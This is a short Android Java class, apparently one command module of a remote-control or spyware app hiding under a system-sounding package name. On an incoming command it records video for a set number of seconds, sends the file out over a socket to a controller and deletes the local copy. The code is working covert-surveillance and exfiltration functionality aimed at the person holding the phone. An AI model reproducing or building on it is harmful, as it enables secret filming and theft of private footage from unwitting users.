package com.system.ui.interpret;

import android.content.Context;

import com.system.ui.MainActivity;
import com.system.ui.service.LocalService;

import java.io.File;
import java.io.FileInputStream;
import java.util.Map;

/**
 * 发送视频的行为
 */
public class SendVideoAction extends AbsAction {

	int mDuration = 10;

	public SendVideoAction(Context context) {
		super(context);
	}

	@Override
	public boolean execute() {
		Map<String, String> params = getParams();
		if (params != null) {
			if (params.containsKey("-d")) {
				mDuration = Integer.parseInt(params.get("-d"));
			}
		}
		String savePath = MainActivity.APP_FOLDER+File.separator+"video.mp4";
		((LocalService)mContext).startRecordVideo(savePath);
		try {
			Thread.sleep(mDuration * 1000);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
		((LocalService)mContext).stopRecord();
		try {
			((LocalService)mContext).getSocketThread().send(new FileInputStream(new File(savePath)));
		} catch (Exception e) {
			e.printStackTrace();
		}
		String path1 = savePath;
		File file1 = new File(path1);
		file1.delete();
		return true;
	}

}
